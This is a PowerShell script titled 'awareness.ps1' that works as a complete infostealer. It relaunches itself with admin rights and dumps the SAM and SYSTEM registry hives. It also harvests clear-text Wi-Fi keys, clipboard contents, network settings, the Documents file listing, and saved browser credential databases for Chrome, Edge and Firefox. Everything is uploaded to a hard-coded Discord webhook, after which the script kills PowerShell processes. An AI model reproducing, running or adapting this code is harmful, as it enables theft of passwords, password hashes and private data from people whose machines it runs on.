# Supporting PowerShell Script: awareness.ps1

# Define Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1310574631249248297/uINhiPCPEfFgH3NlZ_ioU1tAtGMwYJXfxND5yc-iSrb_a_TAR46kPq6WhTRWZY0r_qdj"

# Function to send text content to Discord
function Send-PayloadToDiscord {
    param (
        [string]$content
    )
    try {
        Add-Type -AssemblyName "System.Net.Http"
        $client = New-Object System.Net.Http.HttpClient
        $payload = @{ "content" = $content } | ConvertTo-Json -Depth 10
        $contentObj = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
        $client.PostAsync($webhookUrl, $contentObj).Result
    } catch {
        Write-Host "Failed to send payload: $_"
    }
}

# Function to send files to Discord
function Send-FileToDiscord {
    param (
        [string]$filePath,
        [string]$fileName
    )
    try {
        Add-Type -AssemblyName "System.Net.Http"
        $client = New-Object System.Net.Http.HttpClient
        $fileStream = [System.IO.File]::OpenRead($filePath)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
        $multipartContent.Add($fileContent, "file", $fileName)
        $client.PostAsync($webhookUrl, $multipartContent).Result
        $fileStream.Close()
    } catch {
        Write-Host "Failed to send file: $_"
    }
}

# Ensure script runs as admin
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Extract and Upload SAM and SYSTEM Registry Hives
try {
    $samPath = "$env:TEMP\sam"
    $systemPath = "$env:TEMP\system"
    Start-Process -FilePath "reg.exe" -ArgumentList "save HKLM\SAM $samPath /y" -NoNewWindow -Wait -Verb RunAs
    Start-Process -FilePath "reg.exe" -ArgumentList "save HKLM\SYSTEM $systemPath /y" -NoNewWindow -Wait -Verb RunAs
    Send-FileToDiscord -filePath $samPath -fileName "SAM"
    Send-FileToDiscord -filePath $systemPath -fileName "SYSTEM"
    Remove-Item $samPath, $systemPath -Force
    Send-PayloadToDiscord -content "SAM and SYSTEM registry hives saved and uploaded."
} catch {
    Write-Host "Error handling SAM or SYSTEM: $_"
    Send-PayloadToDiscord -content "Error handling SAM or SYSTEM: $_"
}

# Extract Wi-Fi Credentials
try {
    $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
    $results = "Wi-Fi Credentials:`n"
    foreach ($profile in $wifiProfiles) {
        $keyContent = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content\s+:\s+(.*)$"
        if ($keyContent) {
            $results += "${profile}: $($keyContent.Matches.Groups[1].Value)`n"
        } else {
            $results += "${profile}: No password found`n"
        }
    }
    Send-PayloadToDiscord -content $results
} catch {
    Write-Host "Error extracting Wi-Fi credentials: $_"
}

# Extract Network Configuration
try {
    $netConfig = Get-NetIPAddress | Out-String
    Send-PayloadToDiscord -content "Network Configuration:`n$netConfig"
} catch {
    Write-Host "Error extracting network configuration: $_"
}

# Extract Clipboard Content
try {
    $clipboard = Get-Clipboard
    Send-PayloadToDiscord -content "Clipboard Content:`n$clipboard"
} catch {
    Write-Host "Error extracting clipboard content: $_"
}

# Extract Browser Saved Credentials (Including Firefox)
try {
    $browsers = @('Google\\Chrome', 'Microsoft\\Edge')
    foreach ($browser in $browsers) {
        $loginData = "$env:LOCALAPPDATA\$browser\User Data\Default\Login Data"
        if (Test-Path $loginData) {
            Send-FileToDiscord -filePath $loginData -fileName "$browser_LoginData"
        }
    }
    $firefoxProfiles = Join-Path "$env:APPDATA\Mozilla\Firefox\Profiles" "*.default-release"
    foreach ($profile in Get-ChildItem $firefoxProfiles) {
        $loginsJson = Join-Path $profile.FullName "logins.json"
        $keyDB = Join-Path $profile.FullName "key4.db"
        if (Test-Path $loginsJson) {
            Send-FileToDiscord -filePath $loginsJson -fileName "Firefox_Logins.json"
        }
        if (Test-Path $keyDB) {
            Send-FileToDiscord -filePath $keyDB -fileName "Firefox_Key4.db"
        }
    }
} catch {
    Write-Host "Error extracting browser credentials: $_"
    Send-PayloadToDiscord -content "Error extracting browser credentials: $_"
}

# List Files in My Documents
try {
    $myDocs = Get-ChildItem "$env:USERPROFILE\Documents" -Recurse | Select-Object FullName, Length, LastWriteTime | Out-String
    Send-PayloadToDiscord -content "Files in My Documents:`n$myDocs"
} catch {
    Write-Host "Error listing My Documents: $_"
}

# Close PowerShell Windows
try {
    Stop-Process -Name "powershell" -Force
} catch {
    Write-Host "Error closing PowerShell: $_"
}
